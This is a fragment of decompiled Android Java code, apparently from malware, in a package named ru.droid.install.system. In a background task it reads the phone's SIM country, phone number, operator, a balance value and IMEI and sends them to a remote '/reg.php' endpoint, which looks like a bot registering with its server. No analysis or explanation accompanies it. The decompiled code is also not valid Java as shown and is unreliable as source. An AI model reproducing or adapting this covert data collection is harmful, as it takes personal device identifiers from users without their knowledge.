	
	    public b()
	    {
	        return;
	    }
	
	
	    private static varargs String a()
	    {
	        try {
	            org.apache.http.impl.client.DefaultHttpClient v7_1 = new org.apache.http.impl.client.DefaultHttpClient();
	            String v0_2 = ((android.telephony.TelephonyManager) ru.droid.install.system.AndroidService.a.getSystemService("phone"));
	            try {
	                String v0_5 = new java.net.URI("http", ru.droid.install.system.AndroidService.b, "/reg.php", new StringBuilder().append("country=").append(v0_2.getSimCountryIso()).append("&phone=").append(v0_2.getLine1Number()).append("&op=").append(v0_2.getSimOperatorName()).append("&balance=").append(ru.droid.install.other.ControlReceiver.a).append("&imei=").append(v0_2.getDeviceId()).toString(), 0).toASCIIString();
	            } catch (String v0_6) {
	                v0_6.printStackTrace();
	                v0_5 = "";
	            }
	            String v0_9 = v7_1.execute(new org.apache.http.client.methods.HttpGet(v0_5)).getEntity().getContent();
	            java.io.BufferedReader v1_5 = new java.io.BufferedReader(new java.io.InputStreamReader(v0_9, "utf-8"), 8);
	            StringBuilder v2_4 = new StringBuilder();
	            while(true) {
	                String v3_3 = v1_5.readLine();
	                if (v3_3 == null) {
	                    break;
	                }
	                v2_4.append(new StringBuilder().append(v3_3).append("\n").toString());
	            }
	            v0_9.close();
	            v1_5.close();
	            String v0_10 = v2_4.toString();
	            return v0_10;
	        } catch (String v0) {
	            v0_10 = "1";
	            return v0_10;
	        }
	    }
	
	
	    protected final bridge synthetic Object doInBackground(Object[] p2)
	    {
	        return ru.droid.install.system.b.a();
	    }
	
	
	    protected final bridge synthetic void onPostExecute(Object p1)
	    {
	        super.onPostExecute(((String) p1));
	        return;
	    }
	
